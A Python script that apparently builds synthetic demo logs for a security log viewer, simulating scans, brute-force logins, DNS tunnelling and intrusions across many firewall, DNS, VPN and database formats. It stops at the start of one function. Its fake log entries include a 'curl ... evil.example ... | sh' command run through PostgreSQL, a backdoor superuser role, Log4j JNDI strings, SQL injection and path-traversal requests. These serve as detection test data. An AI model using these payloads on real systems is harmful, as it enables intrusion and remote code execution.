import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(2027)

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "static" / "demo"

BASE = datetime(2026, 10, 15, 8, 0, 0, tzinfo=timezone.utc)
ATTACKER = "203.0.113.66"
SCANNER = "45.155.205.12"
SPRAY = "198.51.100.23"
GOOD_IPS = [f"198.51.100.{i}" for i in range(40, 60)]
LAN = [f"10.0.0.{i}" for i in range(20, 40)]
SERVER = "10.0.0.5"
PUBLIC = ["93.184.216.34", "142.250.74.78", "151.101.1.69", "104.16.132.229", "13.107.42.14"]
USERS = ["alice", "bob", "carol", "dave"]
GUESSED = ["admin", "root", "test", "oracle", "postgres", "user", "guest", "ubuntu"]
BROKEN = "this line was cut by log rotation and is broken on purpose"


def at(index: int, step: int = 29) -> datetime:
    return BASE + timedelta(seconds=index * step)


def bsd(moment: datetime) -> str:
    return moment.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if moment.day < 10 else moment.strftime("%b %d %H:%M:%S")


def iso(moment: datetime, digits: int = 6) -> str:
    return moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{moment.microsecond:06d}"[:digits] + "Z"


def port() -> int:
    return random.randint(40000, 65000)


def scan_ports(count: int) -> list[int]:
    return [21, 22, 23, 25, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 9200, 27017][:count]


def pfirewall_demo() -> str:
    lines = [
        "#Version: 1.5",
        "#Software: Microsoft Windows Firewall",
        "#Time Format: Local",
        "#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path pid",
        "",
    ]

    for i in range(140):
        moment = at(i, 23)
        stamp = moment.strftime("%Y-%m-%d %H:%M:%S")

        if 40 <= i < 60:
            dport = scan_ports(20)[i - 40]
            lines.append(f"{stamp} DROP TCP {SCANNER} 10.0.0.21 {port()} {dport} 44 S {random.randint(10**8, 10**9)} 0 1024 - - - RECEIVE 0")
        elif 80 <= i < 95:
            lines.append(f"{stamp} DROP TCP {ATTACKER} 10.0.0.21 {port()} 3389 52 S {random.randint(10**8, 10**9)} 0 64240 - - - RECEIVE 0")
        elif i == 100:
            lines.append(f"{stamp} ALLOW TCP {ATTACKER} 10.0.0.21 {port()} 445 0 - 0 0 0 - - - RECEIVE 4")
        elif i % 9 == 0:
            lines.append(f"{stamp} ALLOW UDP 10.0.0.21 10.0.0.1 {port()} 53 0 - - - - - - - SEND 2456")
        else:
            lines.append(f"{stamp} ALLOW TCP 10.0.0.21 {random.choice(PUBLIC)} {port()} {random.choice([443, 443, 443, 80])} 0 - 0 0 0 - - - SEND {random.choice([4120, 7788, 9012])}")

    lines.insert(70, f"{at(70, 23).strftime('%Y-%m-%d %H:%M:%S')} INFO-EVENTS-LOST - - - - - - - - - - - - 12 - -")
    lines.insert(110, BROKEN)
    return "\n".join(lines) + "\n"


def snort_demo() -> str:
    alerts = [
        ("1:2001219:20", "ET SCAN Potential SSH Scan", "Attempted Information Leak", 2, "TCP", SCANNER, 22),
        ("1:2010935:3", "ET SCAN Suspicious inbound to MSSQL port 1433", "Potentially Bad Traffic", 2, "TCP", SCANNER, 1433),
        ("1:2006446:13", "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT", "Web Application Attack", 1, "TCP", ATTACKER, 80),
        ("1:2034647:3", "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)", "Attempted Administrator Privilege Gain", 1, "TCP", ATTACKER, 443),
        ("1:2024897:2", "ET MALWARE Cobalt Strike Beacon Observed", "A Network Trojan was detected", 1, "TCP", "10.0.0.33", 443),
        ("1:2027758:2", "ET DNS Query for .to TLD", "Potentially Bad Traffic", 2, "UDP", "10.0.0.33", 53),
        ("1:2013028:7", "ET POLICY curl User-Agent Outbound", "Attempted Information Leak", 3, "TCP", "10.0.0.24", 80),
        ("1:2210045:2", "SURICATA STREAM Packet with invalid ack", "Generic Protocol Command Decode", 3, "TCP", random.choice(GOOD_IPS), 443),
    ]
    lines = []

    for i in range(120):
        rule, message, klass, priority, proto, src, dport = alerts[i % len(alerts)] if i % 3 else random.choice(alerts[5:])
        moment = at(i, 41)
        dst = SERVER if src in (ATTACKER, SCANNER) else random.choice(PUBLIC)
        action = "[Drop] " if priority == 1 and i % 2 == 0 else ""
        stamp = moment.strftime("%m/%d-%H:%M:%S.") + f"{random.randint(0, 999999):06d}"
        lines.append(f"{stamp}  {action}[**] [{rule}] {message} [**] [Classification: {klass}] [Priority: {priority}] {{{proto}}} {src}:{port()} -> {dst}:{dport}")

    lines.insert(60, BROKEN)
    return "\n".join(lines) + "\n"


def leef_demo() -> str:
    lines = []
    events = [
        ("Microsoft", "Windows", "4625", "Authentication", 6, ATTACKER, random.choice(["administrator", "admin", "backup"])),
        ("Microsoft", "Windows", "4624", "Authentication", 1, random.choice(GOOD_IPS), "alice"),
        ("Check Point", "VPN-1 & FireWall-1", "Drop", "Firewall", 5, SCANNER, ""),
        ("Check Point", "VPN-1 & FireWall-1", "Accept", "Firewall", 1, "10.0.0.24", ""),
        ("Imperva", "SecureSphere", "SQL Injection", "Web Attack", 9, ATTACKER, ""),
        ("Trend Micro", "Deep Security", "Malware Detected", "Anti-Malware", 8, "10.0.0.33", "carol"),
    ]

    for i in range(100):
        vendor, product, event_id, cat, sev, src, user = events[(i // 2) % len(events)] if i % 2 else events[1 if i % 4 else 3]
        moment = at(i, 53)
        attrs = [f"devTime={moment.strftime('%b %d %Y %H:%M:%S')}", "devTimeFormat=MMM dd yyyy HH:mm:ss", f"cat={cat}", f"sev={sev}",
                 f"src={src}", f"dst={SERVER}", f"srcPort={port()}", f"dstPort={random.choice([443, 3389, 445, 22]) if cat == 'Firewall' else 443}", "proto=TCP"]

        if user:
            attrs.append(f"usrName={user}")

        if cat == "Firewall":
            attrs.append(f"action={event_id}")

        header = f"<13>{moment.strftime('%b %d %H:%M:%S')} siem-relay "
        lines.append(header + f"LEEF:1.0|{vendor}|{product}|1.0|{event_id}|" + "\t".join(attrs))

    lines.insert(50, BROKEN)
    return "\n".join(lines) + "\n"


def pfsense_demo() -> str:
    lines = []

    for i in range(150):
        moment = at(i, 19)
        stamp = moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{moment.microsecond:06d}+00:00"
        header = f"<134>1 {stamp} fw.home.arpa filterlog 51234 - - "

        if 30 <= i < 50:
            dport = scan_ports(20)[i - 30]
            csv = f"5,,,1000000103,igb0,match,block,in,4,0x0,,241,54321,0,none,6,tcp,44,{SCANNER},203.0.113.10,{port()},{dport},0,S,{random.randint(10**8, 10**9)},,1024,,mss"
        elif 70 <= i < 85:
            csv = f"5,,,1000000103,igb0,match,block,in,4,0x0,,52,{random.randint(1, 65000)},0,DF,6,tcp,60,{ATTACKER},203.0.113.10,{port()},22,0,S,{random.randint(10**8, 10**9)},,64240,,mss;sackOK;TS;nop;wscale"
        elif 100 <= i < 104:
            csv = f"7,,,1000000105,igb0,match,block,in,6,0x00,0x00000,64,udp,17,72,2001:db8:bad::66,2001:db8:1::10,{port()},161,72"
        elif i % 6 == 0:
            csv = f"60,,,1770009876,igb1,match,pass,out,4,0x0,,64,{random.randint(1, 65000)},0,DF,17,udp,73,10.0.0.{random.randint(20, 40)},1.1.1.1,{port()},53,53"
        else:
            csv = f"60,,,1770009876,igb1,match,pass,out,4,0x0,,64,{random.randint(1, 65000)},0,DF,6,tcp,60,10.0.0.{random.randint(20, 40)},{random.choice(PUBLIC)},{port()},443,0,S,{random.randint(10**8, 10**9)},,64240,,mss"

        lines.append(header + csv)

    lines.insert(90, BROKEN)
    return "\n".join(lines) + "\n"


def asa_demo() -> str:
    lines = []
    conn = 1000

    def stamp(i: int) -> str:
        return at(i, 17).strftime("%b %d %Y %H:%M:%S")

    for i in range(170):
        conn += 1
        prefix = f"{stamp(i)} fw01 : "

        if 20 <= i < 40:
            dport = scan_ports(20)[i - 20]
            lines.append(prefix + f'%ASA-4-106023: Deny tcp src outside:{SCANNER}/{port()} dst inside:{SERVER}/{dport} by access-group "outside_in" [0x0, 0x0]')
        elif 60 <= i < 72:
            lines.append(prefix + f"%ASA-6-605004: Login denied from {ATTACKER}/{port()} to outside:203.0.113.10/ssh for user \"{random.choice(GUESSED)}\"")
        elif i == 80:
            lines.append(prefix + "%ASA-4-733100: [Scanning] drop rate-1 exceeded. Current burst rate is 12 per second, max configured rate is 10; Current average rate is 9 per second, max configured rate is 5; Cumulative total count is 5521")
        elif i == 81:
            lines.append(prefix + f"%ASA-6-605005: Login permitted from 10.0.0.24/{port()} to inside:10.0.0.1/ssh for user \"netadmin\"")
        elif i == 82:
            lines.append(prefix + "%ASA-5-111008: User 'netadmin' executed the 'access-list outside_in extended permit tcp any any eq 3389' command.")
        elif i == 83:
            lines.append(prefix + f"%ASA-6-302013: Built inbound TCP connection {conn} for outside:{ATTACKER}/{port()} ({ATTACKER}/{port()}) to inside:{SERVER}/3389 ({SERVER}/3389)")
        elif i == 120:
            lines.append(prefix + f"%ASA-2-106001: Inbound TCP connection denied from {ATTACKER}/{port()} to {SERVER}/445 flags SYN  on interface outside")
        elif i % 2 == 0:
            client = random.choice(LAN)
            lines.append(prefix + f"%ASA-6-302013: Built outbound TCP connection {conn} for outside:{random.choice(PUBLIC)}/443 ({random.choice(PUBLIC)}/443) to inside:{client}/{port()} ({client}/{port()})")
        else:
            client = random.choice(LAN)
            lines.append(prefix + f"%ASA-6-302014: Teardown TCP connection {conn - 1} for outside:{random.choice(PUBLIC)}/443 to inside:{client}/{port()} duration 0:00:{random.randint(10, 59)} bytes {random.randint(500, 90000)} TCP FINs")

    lines.insert(100, BROKEN)
    return "\n".join(lines) + "\n"


def forti_demo() -> str:
    lines = []

    for i in range(150):
        moment = at(i, 21)
        local = moment.astimezone(timezone(timedelta(hours=3)))
        common = f'date={local:%Y-%m-%d} time={local:%H:%M:%S} devname="FGT60F-HQ" devid="FGT60FTK2209XXXX" eventtime={int(moment.timestamp() * 1e9)} tz="+0300"'

        if 30 <= i < 45:
            line = common + f' logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip={SCANNER} srcport={port()} srcintf="wan1" srcintfrole="wan" dstip=203.0.113.10 dstport={scan_ports(15)[i - 30]} dstintf="root" proto=6 action="deny" policyid=0 policytype="policy" service="tcp" srccountry="Netherlands" sentbyte=0 rcvdbyte=0'
        elif i in (50, 51, 52):
            line = common + f' logid="0419016384" type="utm" subtype="ips" eventtype="signature" level="alert" vd="root" severity="critical" srcip={ATTACKER} srcport={port()} srcintf="wan1" dstip={SERVER} dstport=443 dstintf="lan" proto=6 action="dropped" policyid=4 attack="Apache.Log4j.Error.Log.Remote.Code.Execution" attackid=51006 crlevel="critical" craction=1073741826 ref="http://www.fortinet.com/ids/VID51006" msg="applications3: Apache.Log4j.Error.Log.Remote.Code.Execution"'
        elif i == 60:
            line = common + ' logid="0211008192" type="utm" subtype="virus" eventtype="infected" level="warning" vd="root" srcip=104.16.132.229 srcport=443 dstip=10.0.0.27 dstport=55123 proto=6 action="blocked" service="HTTPS" virus="W32/Emotet.ABC!tr" dtype="Virus" filename="invoice_2026.doc" url="https://files.example.net/invoice_2026.doc" user="carol" crlevel="high"'
        elif 70 <= i < 78:
            line = common + f' logid="0100032002" type="event" subtype="system" level="alert" vd="root" logdesc="Admin login failed" sn="0" user="{random.choice(GUESSED)}" ui="https({ATTACKER})" method="https" srcip={ATTACKER} dstip=203.0.113.10 action="login" status="failed" reason="name_invalid" msg="Administrator {random.choice(GUESSED)} login failed from https({ATTACKER}) because of invalid user name"'
        elif i == 90:
            line = common + ' logid="0101037138" type="event" subtype="vpn" level="information" vd="root" logdesc="SSL VPN tunnel up" action="tunnel-up" tunneltype="ssl-tunnel" remip=198.51.100.44 user="alice" group="vpn-users" reason="N/A" msg="SSL tunnel established"'
        elif i % 5 == 0:
            line = common + f' logid="0316013056" type="utm" subtype="webfilter" eventtype="ftgd_blk" level="warning" vd="root" srcip={random.choice(LAN)} srcport={port()} dstip=185.199.110.153 dstport=443 proto=6 action="blocked" service="HTTPS" hostname="free-movies.example" catdesc="Malicious Websites" url="https://free-movies.example/"'
        else:
            line = common + f' logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip={random.choice(LAN)} srcport={port()} srcintf="lan" dstip={random.choice(PUBLIC)} dstport=443 dstintf="wan1" proto=6 action="close" policyid=1 policyname="LAN-to-WAN" service="HTTPS" sentbyte={random.randint(400, 9000)} rcvdbyte={random.randint(1000, 90000)} duration={random.randint(1, 120)}'

        lines.append(line)

    lines.insert(110, BROKEN)
    return "\n".join(lines) + "\n"


def paloalto_demo() -> str:
    lines = []
    serial = "015351000012345"

    for i in range(140):
        moment = at(i, 25)
        stamp = moment.strftime("%Y/%m/%d %H:%M:%S")
        prefix = f"{bsd(moment)} PA-3220 1,{stamp},{serial},"

        if 25 <= i < 40:
            dport = scan_ports(15)[i - 25]
            lines.append(prefix + f"TRAFFIC,drop,2561,{stamp},{SCANNER},203.0.113.10,0.0.0.0,0.0.0.0,interzone-default,,,not-applicable,vsys1,untrust,trust,ethernet1/1,,Log-Fwd,{stamp},0,1,{port()},{dport},0,0,0x0,tcp,deny,60,60,0,1,{stamp},0,any,,7300000000001,0x0,Netherlands,10.0.0.0-10.255.255.255,,1,0,policy-deny")
        elif i in (50, 55, 60):
            name = ["Apache Log4j Remote Code Execution Vulnerability(91991)", "Microsoft Windows SMB Remote Code Execution Vulnerability(33000)", "SQL Injection Attempt(30406)"][(i - 50) // 5]
            lines.append(prefix + f"THREAT,vulnerability,2561,{stamp},{ATTACKER},{SERVER},203.0.113.10,{SERVER},allow-web,,,web-browsing,vsys1,untrust,dmz,ethernet1/1,ethernet1/3,Log-Fwd,{stamp},12345,1,{port()},443,0,0,0x2000,tcp,reset-both,\"/index.php?x=${{jndi:ldap://evil.example/a}}\",{name},any,critical,client-to-server")
        elif i == 70:
            lines.append(prefix + f"THREAT,spyware,2561,{stamp},10.0.0.33,198.18.0.66,203.0.113.10,198.18.0.66,allow-out,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Log-Fwd,{stamp},23456,1,{port()},443,0,0,0x400000,tcp,drop,\"\",Cobalt Strike Beacon Command and Control Traffic Detection(86246),any,high,client-to-server")
        elif i == 80:
            lines.append(f"{bsd(moment)} PA-3220 1,{stamp},{serial},CONFIG,0,2561,{stamp},10.0.0.24,vsys1,edit,admin,Web,Succeeded, vsys  vsys1 rulebase security rules allow-rdp,0,0x0")
        elif i == 81:
            lines.append(f"{bsd(moment)} PA-3220 1,{stamp},{serial},SYSTEM,auth,2561,{stamp},,auth-fail,admin,0,0,general,medium,\"failed authentication for user 'admin'. Reason: Invalid username/password. From: {ATTACKER}.\",1234,0x0")
        else:
            app = random.choice(["ssl", "web-browsing", "dns", "ms-office365", "google-base"])
            dport = 53 if app == "dns" else 443
            lines.append(prefix + f"TRAFFIC,end,2561,{stamp},{random.choice(LAN)},{random.choice(PUBLIC)},203.0.113.10,{random.choice(PUBLIC)},allow-out,corp\\{random.choice(USERS)},,{app},vsys1,trust,untrust,ethernet1/2,ethernet1/1,Log-Fwd,{stamp},{random.randint(10000, 99999)},1,{port()},{dport},{port()},{dport},0x400053,{'udp' if dport == 53 else 'tcp'},allow,{random.randint(500, 90000)},{random.randint(200, 9000)},{random.randint(300, 80000)},{random.randint(4, 90)},{stamp},{random.randint(0, 60)},computer-and-internet-info")

    lines.insert(100, BROKEN)
    return "\n".join(lines) + "\n"


def vpc_demo() -> str:
    lines = ["version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status"]

    for i in range(150):
        start = int(at(i, 20).timestamp())

        if 40 <= i < 60:
            lines.append(f"2 123456789012 eni-0a1b2c3d4e5f60718 {SCANNER} 10.0.1.15 {port()} {scan_ports(20)[i - 40]} 6 1 44 {start} {start + 60} REJECT OK")
        elif 80 <= i < 95:
            lines.append(f"2 123456789012 eni-0a1b2c3d4e5f60718 {ATTACKER} 10.0.1.15 {port()} 22 6 3 180 {start} {start + 60} REJECT OK")
        elif i == 100:
            lines.append(f"2 123456789012 eni-0a1b2c3d4e5f60718 {ATTACKER} 10.0.1.20 {port()} 3389 6 40 4800 {start} {start + 60} ACCEPT OK")
        elif i == 101:
            lines.append(f"2 123456789012 eni-0f9e8d7c6b5a40312 - - - - - - - {start} {start + 60} - NODATA")
        else:
            lines.append(f"2 123456789012 eni-0a1b2c3d4e5f60718 10.0.1.{random.randint(10, 30)} {random.choice(PUBLIC)} {port()} 443 6 {random.randint(5, 80)} {random.randint(500, 90000)} {start} {start + 60} ACCEPT OK")

    lines.insert(120, BROKEN)
    return "\n".join(lines) + "\n"


def alb_demo() -> str:
    lines = []
    attacks = [
        ("GET", "/index.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "sqlmap/1.8#stable (https://sqlmap.org)"),
        ("GET", "/.env", "Mozilla/5.0 (compatible; Nuclei)"),
        ("GET", "/?x=${jndi:ldap://evil.example/a}", "Mozilla/5.0"),
        ("POST", "/wp-login.php", "WPScan v3.8.25"),
        ("GET", "/../../etc/passwd", "Mozilla/5.0 zgrab/0.x"),
    ]

    for i in range(150):
        moment = at(i, 23)

        if 40 <= i < 60:
            method, path, agent = attacks[i % len(attacks)]
            client, status, target_status = ATTACKER, random.choice(["404", "403", "400"]), "-"
        elif 90 <= i < 100:
            method, path, agent = "POST", "/api/login", "python-requests/2.31.0"
            client, status, target_status = "203.0.113.77", "401", "401"
        elif i in (110, 111, 112):
            method, path, agent = "GET", "/api/items", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0"
            client, status, target_status = random.choice(GOOD_IPS), "502", "-"
        else:
            method, path = "GET", random.choice(["/", "/index.html", "/api/items?page=2", "/static/app.js", "/login"])
            agent = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/605.1.15", "curl/8.5.0"])
            client, status, target_status = random.choice(GOOD_IPS), random.choice(["200"] * 10 + ["304", "301"]), None

        target_status = target_status or status
        target = "-" if target_status == "-" else f"10.0.1.{random.randint(10, 20)}:80"
        error = '"TargetConnectionErrorCode"' if status == "502" else '"-"'
        lines.append(
            f'https {iso(moment)} app/shop-alb/50dc6c495c0c9188 {client}:{port()} {target} 0.000 {"-1" if target == "-" else "0.0" + str(random.randint(10, 99))} 0.000 {status} {target_status} {random.randint(100, 900)} {random.randint(200, 9000)} '
            f'"{method} https://shop.example.com:443{path} HTTP/1.1" "{agent}" ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 arn:aws:elasticloadbalancing:eu-central-1:123456789012:targetgroup/shop/73e2d6bc24d8a067 '
            f'"Root=1-{random.randint(10**7, 10**8):x}-{random.randint(10**15, 10**16):x}" "shop.example.com" "arn:aws:acm:eu-central-1:123456789012:certificate/12345678-1234-1234-1234-123456789012" 0 {iso(moment)} "forward" "-" {error} "{target}" "{target_status}" "-" "-"'
        )

    lines.insert(120, BROKEN)
    return "\n".join(lines) + "\n"


def dns_name(name: str) -> str:
    return "".join(f"({len(label)}){label}" for label in name.split(".")) + "(0)"


def tunnel_name(i: int) -> str:
    chunk = "".join(random.choice("abcdef0123456789") for _ in range(52))
    return f"{chunk}.{i:04d}.t.badc2.example"


def dga_name() -> str:
    return "".join(random.choice("qwrtzpsdfghjklxcvbnm") for _ in range(16)) + random.choice([".com", ".net", ".info"])


NORMAL_NAMES = ["www.microsoft.com", "outlook.office365.com", "login.microsoftonline.com", "www.google.com", "github.com", "dc01.corp.local", "_ldap._tcp.corp.local", "update.googleapis.com", "time.windows.com"]


def windows_dns_demo() -> str:
    lines = [
        "DNS Server log file creation at 10/15/2026 7:59:58 AM",
        "Log file wrap at 10/15/2026 7:59:58 AM",
        "",
        "Message logging key (for packets - other items use a subset of these fields):",
        "\tField #  Information         Values",
        "",
    ]

    for i in range(130):
        moment = at(i, 31)
        stamp = moment.strftime("%m/%d/%Y %I:%M:%S %p").lstrip("0").replace("/0", "/")
        xid = f"{random.randint(0, 0xffff):04x}"

        if 40 <= i < 55:
            name, qtype, client, rcode = tunnel_name(i), "TXT", "10.0.0.33", "NOERROR"
        elif 70 <= i < 85:
            name, qtype, client, rcode = dga_name(), "A", "10.0.0.29", "NXDOMAIN"
        elif i == 95:
            name, qtype, client, rcode = "corp.local", "AXFR", ATTACKER, "REFUSED"
        else:
            name, qtype, client, rcode = random.choice(NORMAL_NAMES), random.choice(["A", "A", "AAAA", "SRV"]), random.choice(LAN), "NOERROR"

        if name.startswith("_ldap"):
            qtype = "SRV"

        lines.append(f"{stamp} 0E2C PACKET  000001D2B4A1C2E0 UDP Rcv {client:<15} {xid}   Q [0001   D   NOERROR] {qtype:<6} {dns_name(name)}")
        lines.append(f"{stamp} 0E2C PACKET  000001D2B4A1C2E0 UDP Snd {client:<15} {xid} R Q [8081   DR  {rcode}] {qtype:<6} {dns_name(name)}")

    return "\n".join(lines) + "\n"


def bind_demo() -> str:
    lines = []

    for i in range(130):
        moment = at(i, 27)
        stamp = moment.strftime("%d-%b-%Y %H:%M:%S.") + f"{random.randint(0, 999):03d}"

        if 40 <= i < 55:
            name, qtype, client = tunnel_name(i), "TXT", "10.0.0.33"
        elif 70 <= i < 85:
            name, qtype, client = dga_name(), "A", "10.0.0.29"
        elif i == 95:
            name, qtype, client = "corp.example", "AXFR", ATTACKER
        elif i in (96, 97, 98):
            name, qtype, client = "example.org", "ANY", SCANNER
        else:
            name, qtype, client = random.choice(NORMAL_NAMES), random.choice(["A", "AAAA", "MX", "A"]), random.choice(LAN)

        lines.append(f"{stamp} queries: info: client @0x7f3a{random.randint(0, 0xffff):04x}c0 {client}#{port()} ({name}): query: {name} IN {qtype} +E(0)K (10.0.0.53)")

    lines.insert(60, BROKEN)
    return "\n".join(lines) + "\n"


def pihole_demo() -> str:
    lines = []
    blocked = ["ads.doubleclick.net", "track.adform.net", "telemetry.example-tracker.com", "malware-cdn.badc2.example"]

    for i in range(110):
        moment = at(i, 33)
        stamp = bsd(moment)
        pid = "dnsmasq[812]"
        client = random.choice(LAN)

        if i % 7 == 0:
            name = random.choice(blocked)
            lines.append(f"{stamp} {pid}: query[A] {name} from {client}")
            lines.append(f"{stamp} {pid}: gravity blocked {name} is 0.0.0.0")
        elif 50 <= i < 62:
            name = dga_name()
            lines.append(f"{stamp} {pid}: query[A] {name} from 10.0.0.29")
            lines.append(f"{stamp} {pid}: forwarded {name} to 1.1.1.1")
            lines.append(f"{stamp} {pid}: reply {name} is NXDOMAIN")
        elif 70 <= i < 78:
            name = tunnel_name(i)
            lines.append(f"{stamp} {pid}: query[TXT] {name} from 10.0.0.33")
            lines.append(f"{stamp} {pid}: forwarded {name} to 1.1.1.1")
            lines.append(f"{stamp} {pid}: reply {name} is <TXT>")
        else:
            name = random.choice(NORMAL_NAMES[:5] + ["netflix.com", "api.spotify.com"])
            lines.append(f"{stamp} {pid}: query[A] {name} from {client}")

            if i % 3 == 0:
                lines.append(f"{stamp} {pid}: cached {name} is {random.choice(PUBLIC)}")
            else:
                lines.append(f"{stamp} {pid}: forwarded {name} to 1.1.1.1")
                lines.append(f"{stamp} {pid}: reply {name} is {random.choice(PUBLIC)}")

    return "\n".join(lines) + "\n"


def openvpn_demo() -> str:
    lines = [
        f"{BASE:%Y-%m-%d %H:%M:%S} OpenVPN 2.6.12 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]",
        f"{BASE:%Y-%m-%d %H:%M:%S} UDPv4 link local (bound): [AF_INET][undef]:1194",
        f"{BASE:%Y-%m-%d %H:%M:%S} Initialization Sequence Completed",
    ]
    pool = 6

    for i in range(1, 110):
        moment = at(i, 37)
        stamp = moment.strftime("%Y-%m-%d %H:%M:%S")

        if 30 <= i < 45:
            lines.append(f"{stamp} {SCANNER}:{port()} TLS Error: incoming packet authentication failed from [AF_INET]{SCANNER}:{port()}")
        elif 50 <= i < 60:
            user = random.choice(GUESSED)
            ip_port = f"{ATTACKER}:{port()}"
            lines.append(f"{stamp} {ip_port} PLUGIN_CALL: POST /usr/lib/openvpn/openvpn-plugin-auth-pam.so/PLUGIN_AUTH_USER_PASS_VERIFY status=1")
            lines.append(f"{stamp} {ip_port} AUTH-PAM: BACKGROUND: user '{user}' failed to authenticate: Authentication failure")
            lines.append(f"{stamp} {ip_port} TLS Auth Error: Auth Username/Password verification failed for peer")
        elif i == 70:
            lines.append(f"{stamp} 198.51.100.47:{port()} VERIFY ERROR: depth=0, error=certificate has expired: CN=old-laptop")
        elif i % 4 == 0:
            user = random.choice(USERS)
            ip = random.choice(GOOD_IPS)
            p = port()
            pool += 1
            lines.append(f"{stamp} {ip}:{p} [{user}] Peer Connection Initiated with [AF_INET]{ip}:{p}")
            lines.append(f"{stamp} {user}/{ip}:{p} MULTI_sva: pool returned IPv4=10.8.0.{pool}, IPv6=(Not enabled)")
        elif i % 4 == 2:
            user = random.choice(USERS)
            lines.append(f"{stamp} {user}/{random.choice(GOOD_IPS)}:{port()} SIGTERM[soft,remote-exit] received, client-instance exiting")

    lines.insert(60, BROKEN)
    return "\n".join(lines) + "\n"


def postgres_demo() -> str:
    lines = []
    pid = 4100

    def stamp(i: int) -> str:
        moment = at(i, 31)
        return moment.strftime("%Y-%m-%d %H:%M:%S.") + f"{random.randint(0, 999):03d} UTC"

    lines.append(f"{stamp(0)} [812] LOG:  starting PostgreSQL 16.4 on x86_64-pc-linux-gnu")
    lines.append(f"{stamp(0)} [812] LOG:  database system is ready to accept connections")

    for i in range(1, 110):
        pid += 1

        if 30 <= i < 50:
            user = random.choice(GUESSED + ["postgres", "postgres"])
            lines.append(f"{stamp(i)} [{pid}] LOG:  connection received: host={ATTACKER} port={port()}")

            if user in ("postgres", "admin"):
                lines.append(f"{stamp(i)} [{pid}] FATAL:  password authentication failed for user \"{user}\"")
                lines.append(f"{stamp(i)} [{pid}] DETAIL:  Connection matched file \"/etc/postgresql/16/main/pg_hba.conf\" line 99: \"host all all 0.0.0.0/0 scram-sha-256\"")
            else:
                lines.append(f"{stamp(i)} [{pid}] FATAL:  role \"{user}\" does not exist")
        elif i == 60:
            lines.append(f"{stamp(i)} [{pid}] LOG:  connection received: host={SCANNER} port={port()}")
            lines.append(f"{stamp(i)} [{pid}] FATAL:  no pg_hba.conf entry for host \"{SCANNER}\", user \"postgres\", database \"postgres\", no encryption")
        elif i == 75:
            lines.append(f"{stamp(i)} [{pid}] LOG:  connection received: host={ATTACKER} port={port()}")
            lines.append(f"{stamp(i)} [{pid}] LOG:  connection authorized: user=postgres database=postgres application_name=psql")
            lines.append(f"{stamp(i)} [{pid}] LOG:  statement: COPY cmd_out FROM PROGRAM 'curl -s http://evil.example/x.sh | sh'")
            lines.append(f"{stamp(i)} [{pid}] LOG:  statement: ALTER ROLE backdoor WITH SUPERUSER LOGIN")
        elif i == 90:
            lines.append(f"{stamp(i)} [{pid}] FATAL:  sorry, too many clients already")
        elif i % 10 == 0:
            lines.append(f"{stamp(i)} [813] LOG:  checkpoint starting: time")
            lines.append(f"{stamp(i)} [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled")
        elif i % 7 == 0:
            lines.append(f"{stamp(i)} [{pid}] ERROR:  relation \"usr\" does not exist at character 15")
            lines.append(f"{stamp(i)} [{pid}] STATEMENT:  SELECT * FROM usr WHERE id = 1")
        else:
            client = random.choice(LAN)
            user = random.choice(["app", "app", "reporting"])
            lines.append(f"{stamp(i)} [{pid}] LOG:  connection received: host={client} port={port()}")
            lines.append(f"{stamp(i)} [{pid}] LOG:  connection authorized: user={user} database=shop application_name=api")
            lines.append(f"{stamp(i)} [{pid}] LOG:  disconnection: session time: 0:00:0{random.randint(1, 9)}.{random.randint(100, 999)} user={user} database=shop host={client} port={port()}")

    lines.insert(80, BROKEN)
    return "\n".join(lines) + "\n"


def mysql_demo() -> str:
    lines = [
        f"{iso(BASE)} 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.39) starting as process 1201",
        f"{iso(BASE)} 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.",
        f"{iso(BASE)} 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.39'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.",
    ]

    for i in range(1, 120):
        moment = at(i, 29)
        thread = 100 + i

        if 30 <= i < 55:
            user = random.choice(["root", "root", "admin", "mysql", "test"])
            lines.append(f"{iso(moment)} {thread} [Note] [MY-010926] [Server] Access denied for user '{user}'@'{ATTACKER}' (using password: YES)")
        elif i == 56:
            lines.append(f"{iso(moment)} {thread} [ERROR] [MY-010919] [Server] Host '{ATTACKER}' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'")
        elif i in (70, 71, 72):
            lines.append(f"{iso(moment)} {thread} [Note] [MY-010926] [Server] Access denied for user '{random.choice(['sa', 'wordpress', 'backup'])}'@'{SPRAY}' (using password: YES)")
        elif i == 90:
            lines.append(f"{iso(moment)} 0 [ERROR] [MY-010932] [Server] Too many connections")
        elif i % 6 == 0:
            lines.append(f"{iso(moment)} 0 [Warning] [MY-010055] [Server] IP address '{random.choice(GOOD_IPS)}' could not be resolved: Name or service not known")
        else:
            lines.append(f"{iso(moment)} {thread} [Note] [MY-010914] [Server] Aborted connection {thread} to db: 'shop' user: 'app' host: '{random.choice(LAN)}' (Got timeout reading communication packets).")

    lines.insert(60, BROKEN)
    return "\n".join(lines) + "\n"


def entra_demo() -> str:
